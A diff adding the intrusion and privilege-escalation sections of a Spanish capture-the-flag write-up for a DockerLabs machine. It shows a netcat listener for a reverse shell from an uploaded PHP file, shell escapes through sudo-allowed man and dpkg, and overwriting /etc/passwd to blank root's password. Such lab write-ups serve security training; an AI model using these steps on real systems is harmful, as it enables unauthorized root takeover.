@@ -96,6 +96,88 @@ Finished
 ===============================================================
 ```
 
-Como podemos ver estamos en la propia página, por lo que teniendo en cuenta que la carpeta `upload` es accesible desde el navegador y que podemos escribir en ella con ftp, tenemos que subir a traves de ftp un php malicioso que nos permita ejecutar comandos dentro de la máquina. Para esto podemos usar el script que hice para esta máquina:
+Como podemos ver estamos en la propia página, por lo que teniendo en cuenta que la carpeta `upload` es accesible desde el navegador y que podemos escribir en ella con ftp, tenemos que subir a traves de ftp un php malicioso que nos permita ejecutar comandos dentro de la máquina.
 
-[script](https://github.com/Maciferna/DockerLabs/blob/main/maquina-anonymouspingu/scripts/intrusion.sh)
+# INTRUSION
+
+Para esto podemos usar el script que hice para esta máquina:
+
+[Script](https://github.com/Maciferna/DockerLabs/blob/main/maquina-anonymouspingu/scripts/intrusion.sh)
+
+Una vez descargado, le damos permisos con `chmod +x intrusion.sh`, luego escuchamos con netcat en el puerto 9090:
+
+```css
+nc -nlvp 9090
+```
+
+ahora solo ejecutamos el script y ya habremos ganado acceso como www-data.
+
+# ESCALADA DE PRIVILEGIOS
+
+### www-data
+
+Ahora que estamos dentro, haremos el tratamiento de la tty:
+
+```css
+script /dev/null -c bash # Lo ejecutamos y presionamos ctrl+Z
+stty raw -echo;fg # Ejecutamos y le damos al enter, luego escribimos "reset xterm" y enter
+export TERM=xterm && export SHELL=bash
+```
+
+Ahora si ejecutamos un `sudo -l` veremos que podemos ejecutar el binario man como "pingu". Ahora ejecutaremos `sudo -u pingu man find` y se nos abrirá un menú, una vez en el menú ponemos `!/bin/bash` y ya pivotaremos a pingu
+
+## Pingu
+
+Si ejecutamos `sudo -l` veremos que se puede ejecutar dpkg como gladys, por lo que ejecutaremos `sudo -u gladys dpkg -l` y en el menú nuevamente `!/bin/bash`.
+
+### Gladys
+
+Ahora, podemos ejecutar chown como gladys, por lo que podemos modificar el passwd eliminando la "x" del usuario root para poder cambiar de usuario sin contraseña, para hacerlo tenemos que ejecutar lo siguientes dos comandos:
+
+```css
+sudo chown gladys:gladys /etc/
+sudo chown gladys:gladys /etc/passwd
+```
+
+Ahora como no tenemos nano, haremos algo a lo bruto, que seria dejar el passwd solo con las cosas de root pero sin la "x", y una vez escalamos instalamos nano y ponemos el passwd como antes. Para hacerlo usaremos `echo`:
+
+```css
+echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd
+```
+
+una vez hecho esto ejecutamos `su` y ya seremos root, pero para que no quede todo corrupto, instalamos nano con `apt install nano`, y luego editamos el `/etc/passwd` pegando esto:
+
+```css
+root::0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
+systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
+systemd-timesync:x:996:996:systemd Time Synchronization:/:/usr/sbin/nologin
+messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
+ftp:x:101:103:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+systemd-resolve:x:995:995:systemd Resolver:/:/usr/sbin/nologin
+pingu:x:1001:1001::/home/pingu:/bin/bash
+gladys:x:1002:1002::/home/gladys:/bin/bash
+```
+
+y ahora seremos root sin problemas con los demás usuarios:
+
+![root](./img/root.png)
+
+Gracias por leer.
